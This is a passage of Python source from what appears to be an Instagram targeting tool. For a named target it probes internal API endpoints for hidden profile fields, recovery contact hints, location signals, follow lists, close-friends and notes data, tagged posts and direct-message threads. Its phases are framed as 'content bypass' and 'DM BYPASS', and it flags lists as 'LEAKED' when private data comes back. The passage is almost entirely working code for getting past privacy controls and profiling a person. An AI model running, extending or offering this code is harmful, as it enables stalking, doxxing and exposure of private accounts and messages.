    elif ssr.get('http_status') != 200:
        print(f'      [!] http_status={ssr.get("http_status")} '
               f'(private/unavailable)')
    elif ssr.get('_html_load_state'):
        print(f'      http_status                  = {ssr["http_status"]} '
               f'(html_size={ssr.get("html_size")})')
        print(f'      _html_load_state             = '
               f'{ssr["_html_load_state"]}')
        print(f'      [!] {ssr["_extraction_skipped"]}')
    else:
        print(f'      http_status                  = {ssr["http_status"]} '
               f'(html_size={ssr.get("html_size")})')
        if ssr.get('_scope_marker'):
            print(f'      _scope_marker                = '
                   f'{ssr["_scope_marker"]}')
        for k in ('og_title', 'og_description', 'page_title',
                    'full_name', 'biography', 'category_name', 'category',
                    'is_business', 'is_professional_account', 'is_verified',
                    'is_private', 'follower_count', 'following_count',
                    'media_count', 'og_follower_count', 'og_following_count',
                    'og_media_count', 'business_email', 'business_phone_number',
                    'business_contact_method', 'public_email',
                    'public_phone_number', 'public_phone_country_code',
                    'external_url', 'external_lynx_url', 'connected_fb_page',
                    'biography_email_addresses', 'biography_phone_numbers',
                    'bio_emails_extracted', 'bio_phones_extracted',
                    'html_lang', 'canonical_url'):
            if k in ssr:
                v = ssr[k]
                if isinstance(v, (list, dict)):
                    v = json.dumps(v, ensure_ascii=False, default=str)[:200]
                v_str = str(v)[:200]
                print(f'      {k:<30} = {v_str}')

                                                                   
    print('\n  [H] /info/ business + contact + location populated fields')
    bc = _extract_info_business_contact(u_info)
    intel['info_business_contact'] = bc
    if not bc:
        print('      (no populated business/contact/location field)')
    for k, v in bc.items():
        if isinstance(v, (list, dict)):
            v = json.dumps(v, ensure_ascii=False, default=str)[:200]
        v_str = str(v)[:200]
        print(f'      {k:<45} = {v_str}')

                                   
    print('\n  [I] xmt Threads token decode')
    xmt_d = _decode_xmt_token(u_info.get('threads_profile_glyph_url') or '')
    intel['xmt_decode'] = xmt_d
    for k, v in xmt_d.items():
        v_str = str(v)[:90]
        print(f'      {k:<30} = {v_str}')

                                                                         
    print('\n  [J] users/lookup recovery probe (rate-limit risk)')
    time.sleep(2)
    rec = probe_users_lookup_recovery(target_username, cookies, proxies)
    intel['recovery_probe'] = rec
    if rec.get('rate_limited'):
        print(f'      [!] rate-limited (429); 5-15 dk sonra retry önerilir')
    elif rec.get('error'):
        print(f'      [!] error: {rec["error"]}')
    else:
        for k in ('obfuscated_email', 'obfuscated_phone', 'has_valid_phone',
                    'has_whatsapp_installed', 'can_email_reset', 'can_sms_reset',
                    'fb_login_option', 'has_fb_account_linked',
                    'is_facebook_only_account', 'two_factor_required',
                    'gdpr_required', 'gdpr_consent_required',
                    'lookup_user_country'):
            if k in rec:
                print(f'      {k:<30} = {rec[k]}')

                                                                              
    print('\n  [K] FB profile resolution (real signals; not interop_id)')
    fb_res = _extract_fb_signals(u_info, ssr if isinstance(ssr, dict) else {})
    intel['fb_resolution'] = fb_res
    print(f'      result = {fb_res.get("result")}')
    for cand in fb_res['fb_profile_candidates']:
        print(f'      [{cand["source"]:<32}] -> {cand["url"]}')

                                                               
    print('\n  [L] Geographic signals (server-side target fields only)')
    geo = _extract_geo_signals(u_info,
                                  ssr if isinstance(ssr, dict) else {},
                                  rec if isinstance(rec, dict) else None)
    intel['geo_signals'] = geo
    for s in geo['signals']:
        print(f'      SIGNAL    -> {s}')
    for inf in geo['inferences']:
        print(f'      INFERENCE -> {inf}')

                                                                           
                                                                            
                                                   
    print('\n  [M] Hidden persona enumeration (UI-hidden u_info fields)')
    persona = _enumerate_hidden_persona(u_info)
    intel['hidden_persona'] = persona
    if not persona:
        print('      (no populated hidden persona field)')
    for k, v in persona.items():
        if isinstance(v, (list, dict)):
            v = json.dumps(v, ensure_ascii=False, default=str)[:180]
        v_str = str(v)[:180]
        print(f'      {k:<48} = {v_str}')

                                                                        
    print('\n  [N] Bio links full enumeration (UI: view-all-links tab)')
    bio_links = _enumerate_bio_links(u_info)
    intel['bio_links_full'] = bio_links
    print(f'      bio_link_count = {len(bio_links)}')
    for i, link in enumerate(bio_links[:20], 1):
        title = link.get('title') or '(no title)'
        url_v = link.get('url') or link.get('lynx_url') or ''
        link_type = link.get('link_type') or '?'
        print(f'      [{i:>2}] {title[:40]:<40} ({link_type}) {url_v[:80]}')

                                                                          
                                                                
                                                                       
                                                  
                                               
                                                           
                                                             
                                        
                                                                          
    print('\n  [O] Extended /info/ probe (about_section + chaining + ...)')
    about = probe_about_section_extended(target_pk, cookies,
                                            baseline_user_obj=u_info,
                                            proxies=proxies)
    intel['about_section_extended'] = about
    if about.get('error'):
        print(f'      [!] error: {about["error"]}')
    elif about.get('http_status') != 200:
        print(f'      [!] http_status={about.get("http_status")}')
    else:
        print(f'      _user_obj_field_count = '
               f'{about.get("_user_obj_field_count")} '
               f'(diff_new = {about.get("_diff_new_field_count")})')
        for k in ('account_creation_country', 'account_creation_year_month',
                    'account_age_month', 'former_usernames',
                    'name_changes_count', 'usernames_history',
                    'has_run_ads', 'has_run_political_ads',
                    'is_verified_by_meta', 'verified_external',
                    'transparency_product', 'transparency_label',
                    'about', 'about_section', 'eimu_id', 'pronouns',
                    'account_badges'):
            if k in about:
                v = about[k]
                if isinstance(v, (list, dict)):
                    v = json.dumps(v, ensure_ascii=False, default=str)[:250]
                v_str = str(v)[:250]
                print(f'      {k:<35} = {v_str}')
        for k in ('chaining_info', 'chaining_results',
                    'country_block_dialog', 'persistent_actions',
                    'high_interest_accounts'):
            if k in about:
                v = about[k]
                v_str = json.dumps(v, ensure_ascii=False, default=str)
                print(f'      {k:<35} = (size={len(v_str)} chars) '
                       f'{v_str[:160]}')
                                                                            
        diff_new = about.get('diff_new_fields_populated') or {}
        if diff_new:
            print(f'      --- DIFF: extended-only populated fields '
                   f'({len(diff_new)} field) ---')
            for k, v in diff_new.items():
                if isinstance(v, (list, dict)):
                    v = json.dumps(v, ensure_ascii=False, default=str)[:200]
                v_str = str(v)[:200]
                print(f'      [+] {k:<32} = {v_str}')

                                                                            
    print('\n  [P] Highlights tray probe (UI: only via story-ring tap)')
    time.sleep(0.5)
    htray = probe_highlights_tray(target_pk, cookies, proxies)
    intel['highlights_tray'] = htray
    if htray.get('error'):
        print(f'      [!] error: {htray["error"]}')
    elif htray.get('http_status') != 200:
        print(f'      [!] http_status={htray.get("http_status")}')
    else:
        print(f'      highlight_count = {htray.get("highlight_count")}')
        for h in htray.get('highlights', [])[:15]:
            title = (h.get('title') or '(untitled)')[:35]
            mc = h.get('media_count')
            cre = h.get('created_at_iso') or '?'
            lat = h.get('latest_reel_media_iso') or '?'
            pin = ' [pinned]' if h.get('is_pinned_highlight') else ''
            print(f'      - {title:<35} media={mc:<3} '
                   f'created={cre[:10]} latest={lat[:10]}{pin}')

                                                                            
                                                                       
                                                                        
                                                                        
                                                                   
    print('\n  [R] HTTP response header forensics (sensitive viewer headers'
           ' redacted)')
    hdr = _extract_response_header_forensics(info_response_headers)
    intel['response_header_forensics'] = hdr
    tc = hdr.get('target_context') or {}
    if tc:
        print(f'      --- target_context ({len(tc)}) ---')
        for k, v in tc.items():
            print(f'      {k:<28} = {str(v)[:120]}')
    else:
        print('      (no target_context headers in response)')
    vc = hdr.get('viewer_context_non_sensitive') or {}
    if vc:
        print(f'      --- viewer_context_non_sensitive ({len(vc)}) ---')
        for k, v in vc.items():
            print(f'      {k:<28} = {str(v)[:80]}')
    print(f'      [note] {hdr.get("_note", "")}')

    path = _save_json(target_username, 'target_internal_phase33.json', intel)
    print(f'\n  -> {path}')
    return intel


                                                                               
                                                       
                                                                               
                                                                           
                   
 
                                                                       
                                                              
                                                     
                                                                                           
                                                                    
                                                              
                                                        
                                                           
                                                                     
                                                          
                                                          
                                                       
                                                                   
                                                                 

def probe_followgraph_phase34(target_pk, target_username, cookies,
                               bearer_info=None, proxies=None):
    """Phase 34: Follow graph + content bypass yeni vektörleri."""
    h = (_headers_with_bearer(cookies, bearer_info)
         if bearer_info and bearer_info.get('bearer') else _headers(cookies))
    out = {}

    rank_tok = str(_uuid_mod.uuid4())
    viewer_pk = cookies.get('ds_user_id', '')

                                                                          
                                            
                                                                          
    follow_probes = [
                                                              
        ('a_www_following',
         f'https://www.instagram.com/api/v1/friendships/{target_pk}/following/'
         f'?count=200&rank_token={rank_tok}&search_surface=follow_list_page'
         f'&includes_hashtags=true'),
                               
        ('a_www_followers',
         f'https://www.instagram.com/api/v1/friendships/{target_pk}/followers/'
         f'?count=200&rank_token={rank_tok}&search_surface=follow_list_page'),
                                                                           
        ('b_iig_following_uuid',
         f'https://i.instagram.com/api/v1/friendships/{target_pk}/following/'
         f'?count=200&rank_token={rank_tok}&search_surface=follow_list_page'
         f'&includes_hashtags=true&include_reel=true'),
                                   
        ('b_followers_v2',
         f'https://i.instagram.com/api/v1/users/{target_pk}/followers_v2/'
         f'?count=200&rank_token={rank_tok}'),
                                                           
        ('c_mutual_followers',
         f'https://i.instagram.com/api/v1/friendships/{target_pk}/'
         f'mutual_followers/?count=200&rank_token={rank_tok}'),
                            
        ('c_www_mutual',
         f'https://www.instagram.com/api/v1/friendships/{target_pk}/'
         f'mutual_followers/?count=200'),
                                                                   
        ('d_gql_following',
         f'https://www.instagram.com/graphql/query/'
         f'?query_hash=56066f031e6239f35a904ac20c9f37d9'
         f'&variables=%7B%22id%22%3A%22{target_pk}%22%2C%22first%22%3A50%7D'),
                                       
        ('d_gql_followers_v3',
         f'https://www.instagram.com/graphql/query/'
         f'?query_hash=c76146de99bb02f6415203be841dd25a'
         f'&variables=%7B%22id%22%3A%22{target_pk}%22%2C%22first%22%3A50%7D'),
                                          
        ('d_gql_following_docid',
         f'https://www.instagram.com/graphql/query/'
         f'?doc_id=17874545323001329'
         f'&variables=%7B%22id%22%3A%22{target_pk}%22%2C%22first%22%3A50%7D'),
    ]

    for label, url in follow_probes:
        try:
            hh = dict(h)
            hh['accept'] = 'application/json, */*'
            r = requests.get(url, headers=hh, cookies=cookies,
                             timeout=15, proxies=proxies)
        except requests.exceptions.RequestException as e:
            out[label] = {'error': type(e).__name__}
            time.sleep(0.3)
            continue

        entry = {'http_status': r.status_code, 'size': len(r.text)}
        if r.status_code == 200:
            try:
                d = r.json()
                entry['raw_keys'] = list(d.keys())[:20] if isinstance(d, dict) else None
                                   
                users = d.get('users') or []
                if not users:
                                   
                    gql_u = ((d.get('data') or {}).get('user') or {})
                    edge = (gql_u.get('edge_follow') or
                            gql_u.get('edge_followed_by') or {})
                    users = [e.get('node', {}) for e in (edge.get('edges') or [])]
                    if not users:
                        entry['gql_total_count'] = edge.get('count')
                if users:
                    entry['count'] = len(users)
                    entry['users'] = [
                        {'pk': u.get('pk') or u.get('id'),
                         'username': u.get('username'),
                         'full_name': u.get('full_name'),
                         'is_private': u.get('is_private')}
                        for u in users[:50]
                    ]
                else:
                    entry['count'] = 0
            except (json.JSONDecodeError, ValueError):
                entry['parse_error'] = True
                entry['head'] = r.text[:300]
        else:
            entry['head'] = r.text[:200]
        out[label] = entry
        time.sleep(0.5)

                                                                          
                                                               
                                                                          
    ayml_probes = [
        ('e_ayml_target',
         f'https://i.instagram.com/api/v1/discover/ayml/'
         f'?module_name=explore_v2_profile_card&target_user_id={target_pk}'
         f'&max_id=&include_reel=true'),
        ('e_ayml_www',
         f'https://www.instagram.com/api/v1/discover/ayml/'
         f'?module_name=profile&target_user_id={target_pk}'),
        ('e_top_live',
         f'https://i.instagram.com/api/v1/discover/top_live/'
         f'?target_user_id={target_pk}'),
        ('e_profile_similar',
         f'https://i.instagram.com/api/v1/users/{target_pk}/'
         f'similar_accounts/?count=30'),
    ]

    for label, url in ayml_probes:
        try:
            r = requests.get(url, headers=h, cookies=cookies,
                             timeout=15, proxies=proxies)
        except requests.exceptions.RequestException as e:
            out[label] = {'error': type(e).__name__}
            time.sleep(0.3)
            continue

        entry = {'http_status': r.status_code, 'size': len(r.text)}
        if r.status_code == 200:
            try:
                d = r.json()
                entry['raw_keys'] = list(d.keys())[:20] if isinstance(d, dict) else None
                users = d.get('users') or d.get('suggested_users') or []
                if isinstance(users, list) and users:
                    entry['count'] = len(users)
                    entry['users'] = [
                        {'pk': u.get('pk') or u.get('id'),
                         'username': u.get('username'),
                         'full_name': u.get('full_name'),
                         'social_context': u.get('social_context'),
                         'is_private': u.get('is_private')}
                        for u in users[:30]
                    ]
            except (json.JSONDecodeError, ValueError):
                entry['parse_error'] = True
                entry['head'] = r.text[:300]
        else:
            entry['head'] = r.text[:200]
        out[label] = entry
        time.sleep(0.4)

                                                                          
                                                        
                                                                          
    reels_probes = [
                                                                       
        ('f_reels_tab',
         f'https://i.instagram.com/api/v1/clips/user/'
         f'?target_user_id={target_pk}&page_size=20'
         f'&include_feed_video=true&clips_only=true'),
                            
        ('f_reels_media_direct',
         f'https://i.instagram.com/api/v1/feed/reels_media/'
         f'?user_ids={target_pk}&source=profile_view&reason=profile'),
                           
        ('f_www_clips',
         f'https://www.instagram.com/api/v1/clips/user/'
         f'?target_user_id={target_pk}&page_size=12'),
                              
        ('f_igtv_content',
         f'https://i.instagram.com/api/v1/igtv/profile_content/'
         f'?username={target_username}&max_id='),
                                          
        ('f_feed_surface_explore',
         f'https://i.instagram.com/api/v1/feed/user/{target_pk}/'
         f'?count=12&surface=explore&rank_token={rank_tok}'),
                      
        ('f_pinned_posts',
         f'https://i.instagram.com/api/v1/users/{target_pk}/'
         f'pinned_channels_info/'),
                                
        ('f_soundboard',
         f'https://i.instagram.com/api/v1/soundboard/user_audio_clips/'
         f'?user_id={target_pk}&count=12'),
    ]

    for label, url in reels_probes:
        try:
            r = requests.get(url, headers=h, cookies=cookies,
                             timeout=15, proxies=proxies)
        except requests.exceptions.RequestException as e:
            out[label] = {'error': type(e).__name__}
            time.sleep(0.3)
            continue

        entry = {'http_status': r.status_code, 'size': len(r.text)}
        if r.status_code == 200:
            try:
                d = r.json()
                entry['raw_keys'] = list(d.keys())[:20] if isinstance(d, dict) else None
                items = d.get('items') or d.get('clips') or d.get('media') or []
                if isinstance(items, list) and items:
                    entry['item_count'] = len(items)
                    entry['media_items'] = [
                        {
                            'media_id': (it.get('id') or it.get('pk')
                                          or (it.get('media') or {}).get('id')),
                            'taken_at': _ts_iso(
                                it.get('taken_at') or
                                (it.get('media') or {}).get('taken_at'), 's'),
                            'media_type': (it.get('media_type') or
                                           (it.get('media') or {}).get('media_type')),
                            'like_count': (it.get('like_count') or
                                           (it.get('media') or {}).get('like_count')),
                            'image_url': (
                                (((it.get('media') or it).get('image_versions2')
                                   or {}).get('candidates') or [{}])[0]
                                .get('url', '')[:120]),
                        }
                        for it in items[:12]
                    ]
                            
                igtv = d.get('items') or []
                if igtv and label == 'f_igtv_content':
                    entry['igtv_count'] = len(igtv)
            except (json.JSONDecodeError, ValueError):
                entry['parse_error'] = True
                entry['head'] = r.text[:300]
        else:
            entry['head'] = r.text[:200]
        out[label] = entry
        time.sleep(0.4)

                                                                          
                                       
                                                                          
    social_probes = [
                                                                         
        ('g_notes_about_target',
         f'https://i.instagram.com/api/v1/notes/user_notes/'
         f'?target_user_id={target_pk}'),
                                           
        ('g_notes_feed',
         'https://i.instagram.com/api/v1/notes/user_notes/'
         '?include_reel=true&reason=notes_load'),
                                                         
        ('g_close_friends',
         'https://i.instagram.com/api/v1/friendships/bestie_feed/'
         '?source=unknown'),
                        
        ('g_restrict_status',
         f'https://i.instagram.com/api/v1/restrict/get_blocked/?target_user_id='
         f'{target_pk}'),
                                                
        ('g_subscription_feed',
         f'https://i.instagram.com/api/v1/feed/channel_posts/'
         f'?target_user_id={target_pk}&include_feed_video=true'),
    ]

    for label, url in social_probes:
        try:
            r = requests.get(url, headers=h, cookies=cookies,
                             timeout=15, proxies=proxies)
        except requests.exceptions.RequestException as e:
            out[label] = {'error': type(e).__name__}
            time.sleep(0.3)
            continue

        entry = {'http_status': r.status_code, 'size': len(r.text)}
        if r.status_code == 200:
            try:
                d = r.json()
                entry['raw_keys'] = list(d.keys())[:20] if isinstance(d, dict) else None
                notes = d.get('notes') or d.get('items') or []
                if notes:
                    entry['note_count'] = len(notes)
                    entry['notes'] = [
                        {'user_id': n.get('user_id'), 'text': str(n.get('text') or '')[:200],
                         'expires_at': _ts_iso(n.get('expires_at'), 's')}
                        for n in notes[:10]
                    ]
                users = d.get('users') or d.get('bestie_users') or []
                if users:
                    entry['user_count'] = len(users)
                    entry['users_sample'] = [
                        {'pk': u.get('pk'), 'username': u.get('username')}
                        for u in users[:10]
                    ]
            except (json.JSONDecodeError, ValueError):
                entry['parse_error'] = True
                entry['head'] = r.text[:300]
        else:
            entry['head'] = r.text[:200]
        out[label] = entry
        time.sleep(0.4)

                                                                          
                                                                    
                                                                          
    commerce_probes = [
        ('h_commerce_user_feed',
         f'https://i.instagram.com/api/v1/commerce/products/user_feed/'
         f'?user_id={target_pk}&surface=profile'),
        ('h_commerce_catalog',
         f'https://i.instagram.com/api/v1/commerce/user/{target_pk}/'
         f'catalog_feed/?count=12'),
                                                
        ('h_usertags_recent',
         f'https://i.instagram.com/api/v1/usertags/{target_pk}/feed/'
         f'?count=50&rank_token={rank_tok}&rank_type=recent'),
                          
        ('h_usertags_www',
         f'https://www.instagram.com/api/v1/usertags/{target_pk}/feed/'
         f'?count=50'),
    ]

    for label, url in commerce_probes:
        try:
            r = requests.get(url, headers=h, cookies=cookies,
                             timeout=15, proxies=proxies)
        except requests.exceptions.RequestException as e:
            out[label] = {'error': type(e).__name__}
            time.sleep(0.3)
            continue

        entry = {'http_status': r.status_code, 'size': len(r.text)}
        if r.status_code == 200:
            try:
                d = r.json()
                entry['raw_keys'] = list(d.keys())[:20] if isinstance(d, dict) else None
                items = d.get('items') or d.get('products') or []
                if items:
                    entry['item_count'] = len(items)
                    entry['leaked_total_count'] = d.get('total_count')
                    entry['items_sample'] = [
                        {
                            'id': it.get('id') or it.get('pk'),
                            'code': it.get('code'),
                            'taken_at': _ts_iso(it.get('taken_at'), 's'),
                            'tagger_pk': (it.get('user') or {}).get('pk'),
                        }
                        for it in items[:10]
                    ]
                else:
                    entry['leaked_total_count'] = d.get('total_count')
            except (json.JSONDecodeError, ValueError):
                entry['parse_error'] = True
                entry['head'] = r.text[:300]
        else:
            entry['head'] = r.text[:200]
        out[label] = entry
        time.sleep(0.4)

                                                                          
                                                                          
                                                                          
                                                             
    dm_refresh_probes = [
                                         
        ('i_pending_fresh',
         f'https://www.instagram.com/api/v1/direct_v2/pending_inbox/'
         f'?visual_message_return_type=unseen&cursor=&direction=older'
         f'&seq_id=0&snapshot_at_ms=0'),
                                    
        ('i_thread_v3_participants',
         f'https://www.instagram.com/api/v1/direct_v2/threads/'
         f'get_by_participants/?recipient_users=%5B{target_pk}%5D'
         f'&seq_id=0&limit=20&fetch_reason=preload&include_message_request=true'),
                                                                              
        ('i_broadcast_check',
         f'https://i.instagram.com/api/v1/live/get_joined_broadcast/'
         f'?user_id={target_pk}'),
                                                  
        ('i_msg_request_status',
         f'https://www.instagram.com/api/v1/direct_v2/'
         f'get_message_request_hide_state/?participant_user_id={target_pk}'),
    ]

    for label, url in dm_refresh_probes:
        try:
            hh = dict(h)
            hh['x-csrftoken'] = cookies.get('csrftoken', '')
            r = requests.get(url, headers=hh, cookies=cookies,
                             timeout=15, proxies=proxies)
        except requests.exceptions.RequestException as e:
            out[label] = {'error': type(e).__name__}
            time.sleep(0.3)
            continue

        entry = {'http_status': r.status_code, 'size': len(r.text)}
        if r.status_code == 200:
            try:
                d = r.json()
                entry['raw_keys'] = list(d.keys())[:20] if isinstance(d, dict) else None
                thread = d.get('thread') or {}
                if thread:
                    items = thread.get('items') or []
                    entry['thread_id'] = thread.get('thread_id')
                    entry['message_count'] = len(items)
                    entry['messages'] = [
                        {'user_id': it.get('user_id'),
                         'timestamp': _ts_iso(it.get('timestamp'), 'us'),
                         'item_type': it.get('item_type'),
                         'text': (it.get('text') or '')[:300]}
                        for it in items[:20]
                    ]
                inbox = d.get('pending_inbox') or {}
                threads = inbox.get('threads', []) if isinstance(inbox, dict) else []
                target_threads = []
                for t in threads:
                    if any(str(u.get('pk')) == str(target_pk)
                           for u in (t.get('users') or [])):
                        target_threads.append({
                            'thread_id': t.get('thread_id'),
                            'last_item_ts': _ts_iso(t.get('last_permanent_item_ts'), 'us'),
                            'items': [
                                {'user_id': it.get('user_id'),
                                 'text': (it.get('text') or '')[:200],
                                 'item_type': it.get('item_type')}
                                for it in (t.get('items') or [])[:10]
                            ],
                        })
                if target_threads:
                    entry['target_threads'] = target_threads
            except (json.JSONDecodeError, ValueError):
                entry['parse_error'] = True
                entry['head'] = r.text[:300]
        else:
            entry['head'] = r.text[:200]
        out[label] = entry
        time.sleep(0.4)

    return out


def run_phase34(target_username, target_pk, cookies, proxies=None):
    print(f'[*] Phase 34: FOLLOW GRAPH + CLIPS + MEDIA BYPASS pk={target_pk}')
    cookies_obj = cookies

                                      
    print('  [bearer] Bearer token alınıyor...')
    bearer_info = _get_bearer_token(cookies_obj, target_pk, proxies)
    if bearer_info.get('bearer'):
        print('  [bearer] OK — temporary authorization obtained')
    else:
        print(f'  [bearer] WARN: bearer yok, bazı i.ig probes başarısız olabilir')

    intel = probe_followgraph_phase34(
        target_pk, target_username, cookies_obj, bearer_info, proxies)
                                                                        
                                                                          
    intel['target_pk'] = str(target_pk)

                       
    print('\n  --- A/B/C/D) FOLLOW GRAPH RESULTS ---')
    for lbl in ('a_www_following', 'a_www_followers', 'b_iig_following_uuid',
                 'b_followers_v2', 'c_mutual_followers', 'c_www_mutual',
                 'd_gql_following', 'd_gql_followers_v3', 'd_gql_following_docid'):
        e = intel.get(lbl, {})
        st = e.get('http_status')
        cnt = e.get('count', 0)
        gtc = e.get('gql_total_count')
        if cnt and cnt > 0:
            print(f'  *** FOLLOW LIST LEAKED [{lbl}] count={cnt} ***')
            for u in (e.get('users') or [])[:15]:
                priv = '[P]' if u.get('is_private') else '[O]'
                print(f'      {priv} @{u.get("username")} pk={u.get("pk")} '
                      f'fn={u.get("full_name")}')
        elif gtc:
            print(f'  [gated] {lbl}: total={gtc} items=0')
        elif st:
            print(f'  [{st}] {lbl}')
        else:
            print(f'  [err] {lbl}: {e.get("error")}')

    print('\n  --- E) DISCOVER/AYML ---')
    for lbl in ('e_ayml_target', 'e_ayml_www', 'e_top_live', 'e_profile_similar'):
        e = intel.get(lbl, {})
        st = e.get('http_status')
        cnt = e.get('count', 0)
        if cnt:
            print(f'  [{st}] {lbl}: {cnt} users')
            for u in (e.get('users') or [])[:5]:
                ctx = u.get('social_context', '')
                print(f'      @{u.get("username")} fn={u.get("full_name")} '
                      f'ctx={ctx}')
        elif st:
            print(f'  [{st}] {lbl}')

    print('\n  --- F) REELS/CLIPS/IGTV ---')
    for lbl in ('f_reels_tab', 'f_reels_media_direct', 'f_www_clips',
                 'f_igtv_content', 'f_feed_surface_explore',
                 'f_pinned_posts', 'f_soundboard'):
        e = intel.get(lbl, {})
        st = e.get('http_status')
        ic = e.get('item_count') or e.get('igtv_count') or 0
        if ic:
            print(f'  *** CONTENT FOUND [{lbl}] items={ic} ***')
            for it in (e.get('media_items') or [])[:5]:
                print(f'      media_id={it.get("media_id")} '
                      f'taken_at={it.get("taken_at")} '
                      f'type={it.get("media_type")}')
        elif st:
            print(f'  [{st}] {lbl}')

    print('\n  --- G) NOTES/CLOSE FRIENDS ---')
    for lbl in ('g_notes_about_target', 'g_notes_feed', 'g_close_friends',
                 'g_restrict_status', 'g_subscription_feed'):
        e = intel.get(lbl, {})
        st = e.get('http_status')
        nc = e.get('note_count', 0)
        uc = e.get('user_count', 0)
        if nc:
            print(f'  *** NOTES [{lbl}] count={nc} ***')
            for n in (e.get('notes') or [])[:3]:
                print(f'      user_id={n.get("user_id")}: {n.get("text","")[:80]}')
        elif uc:
            print(f'  [{st}] {lbl}: {uc} users')
        elif st == 200:
            print(f'  [200] {lbl}: empty (keys={e.get("raw_keys")})')
        elif st:
            print(f'  [{st}] {lbl}')

    print('\n  --- H) COMMERCE/USERTAGS ---')
    for lbl in ('h_commerce_user_feed', 'h_commerce_catalog',
                 'h_usertags_recent', 'h_usertags_www'):
        e = intel.get(lbl, {})
        st = e.get('http_status')
        ic = e.get('item_count', 0)
        tc = e.get('leaked_total_count')
        if ic:
            print(f'  *** COMMERCE CONTENT [{lbl}] items={ic} total={tc} ***')
        elif tc is not None:
            print(f'  [{st}] {lbl}: total_count={tc} (items gated)')
        elif st:
            print(f'  [{st}] {lbl}')

    print('\n  --- I) DM BYPASS ---')
    for lbl in ('i_pending_fresh', 'i_thread_v3_participants',
                 'i_broadcast_check', 'i_msg_request_status'):
        e = intel.get(lbl, {})
        st = e.get('http_status')
        if e.get('messages'):
            print(f'  *** DM CONTENT [{lbl}] msgs={e["message_count"]} ***')
            for m in (e.get('messages') or [])[:5]:
                print(f'      [{m.get("timestamp")}] uid={m.get("user_id")} '
                      f'{m.get("item_type")}: {m.get("text","")[:80]}')
        elif e.get('target_threads'):
            print(f'  *** THREAD FOUND [{lbl}] ***')
            for t in e['target_threads'][:3]:
                print(f'      thread={t.get("thread_id")} '
                      f'last={t.get("last_item_ts")}')
        elif st:
            print(f'  [{st}] {lbl}')

    path = _save_json(target_username, 'phase34_followgraph.json', intel)
    print(f'\n  -> {path}')
    return intel


                                                                               
     
                                                                               

                                                                               
                                              
                                                                               
 
                                                                            
                                                                       
                                                                          
                                        
 
                                                                          
                                                                        
                                                                            

def _build_current_reciprocal_candidates(target_pk, phase28_intel=None,
                                           phase32_intel=None):
    """Combine only Phase 28/32 candidates observed by this process.

    Persisted unions deliberately are not accepted here: they may represent a
    different viewer session or observation window even when stored below the
    same username directory.
    """
    candidates = {}
    target_pk_s = str(target_pk)

    def merge_candidate(pk, info, source, strength):
        pk_s = str(pk or '')
        if not pk_s or pk_s == target_pk_s or not isinstance(info, dict):
            return
        entry = candidates.setdefault(pk_s, {'pk': pk_s})
        for key in ('username', 'full_name', 'is_private', 'is_verified'):
            if entry.get(key) is None and info.get(key) is not None:
                entry[key] = info.get(key)
        sources = entry.setdefault('_current_sources', [])
        if source not in sources:
            sources.append(source)
        try:
            source_strength = max(1, int(strength or 1))
        except (TypeError, ValueError):
            source_strength = 1
        entry['_current_source_strength'] = max(
            int(entry.get('_current_source_strength') or 0), source_strength)

    if isinstance(phase28_intel, dict):
        module_sweep = phase28_intel.get('module_sweep') or {}
        if isinstance(module_sweep, dict) and not module_sweep.get('error'):
            current_cluster = module_sweep.get('cluster_union') or {}
            if isinstance(current_cluster, dict):
                for pk, info in current_cluster.items():
                    if not isinstance(info, dict):
                        continue
                    modules = info.get('source_modules') or []
                    strength = (len({str(value) for value in modules})
                                if isinstance(modules, (list, tuple, set)) else 1)
                    merge_candidate(pk, info, 'phase28_current_run', strength)

    if isinstance(phase32_intel, dict) and not phase32_intel.get('error'):
        users = phase32_intel.get('users') or []
        if isinstance(users, list):
            for user in users:
                if (not isinstance(user, dict)
                        or user.get('_current_session_seen') is False):
                    continue
                seen_runs = user.get('_seen_runs')
                if not isinstance(seen_runs, list) or not seen_runs:
                    continue
                unique_runs = {str(run_id) for run_id in seen_runs}
                merge_candidate(user.get('pk'), user,
                                'phase32_current_session', len(unique_runs))

    return candidates


def harvest_reciprocal_chaining(target_pk, target_username, cookies,
                                  proxies=None, max_check=30,
                                  current_candidates=None):
    """Probe only candidates produced in memory by this CLI execution."""
                                                                           
                                                             
    cluster = current_candidates if isinstance(current_candidates, dict) else {}
    if not cluster:
        return {
            'error': 'no_current_reciprocal_source',
            'target_pk': str(target_pk),
            'scope': 'current_process_only',
            'detail': ('Phase 35 needs successful current Phase 32 and/or '
                       'Phase 28 candidates; stale disk pools are not used.'),
        }
    sorted_cluster = sorted(
        ((pk, info) for pk, info in cluster.items()
         if isinstance(info, dict) and str(pk) != str(target_pk)),
        key=lambda kv: -int(kv[1].get('_current_source_strength') or 1))
    top = sorted_cluster[:max_check]

    h = _headers(cookies)
    out = {
        'target_pk': str(target_pk),
        'scope': 'current_query_target_recommendations',
        'relationship_verified': False,
        'semantics': 'recommendation_overlap_not_follow_graph',
        'cluster_top_tested': len(top),
        'reciprocal_results': [],
        'two_way_overlap_count': 0,
        'one_way_only_count': 0,
        'no_chain_relation': 0,
    }
    target_pk_s = str(target_pk)

    for i, (cluster_pk, info) in enumerate(top):
        url = (f'https://i.instagram.com/api/v1/discover/chaining/'
                f'?target_id={cluster_pk}&module_name=profile')
        try:
            r = requests.get(url, headers=h, cookies=cookies,
                              timeout=15, proxies=proxies)
        except requests.exceptions.RequestException as e:
            out['reciprocal_results'].append({
                'cluster_pk': cluster_pk,
                'cluster_username': info.get('username'),
                'error': type(e).__name__,
            })
            time.sleep(0.4)
            continue

        if r.status_code != 200:
            out['reciprocal_results'].append({
                'cluster_pk': cluster_pk,
                'cluster_username': info.get('username'),
                'http_status': r.status_code,
            })
            time.sleep(0.4)
            continue

        try:
            d = r.json()
        except json.JSONDecodeError:
            time.sleep(0.4)
            continue

        users = d.get('users') or []
        target_in_chain = False
        target_rank = None
        for idx, u in enumerate(users):
            if str(u.get('pk', '')) == target_pk_s:
                target_in_chain = True
                target_rank = idx
                target_full_name = u.get('full_name')
                target_social_context = u.get('social_context')
                break

        result = {
            'cluster_pk': cluster_pk,
            'cluster_username': info.get('username'),
            'cluster_full_name': info.get('full_name'),
            'cluster_in_target_chain': True,
            'target_in_their_chain': target_in_chain,
            'target_rank_in_their_chain': target_rank,
            'their_chain_size': len(users),
            'relationship_verified': False,
        }
        if target_in_chain:
            result['association_class'] = 'BIDIRECTIONAL_RECOMMENDATION_OVERLAP'
            result['target_full_name_in_chain'] = target_full_name
            result['target_social_context_in_chain'] = target_social_context
            out['two_way_overlap_count'] += 1
        else:
            result['association_class'] = 'ONE_WAY_RECOMMENDATION_ONLY'
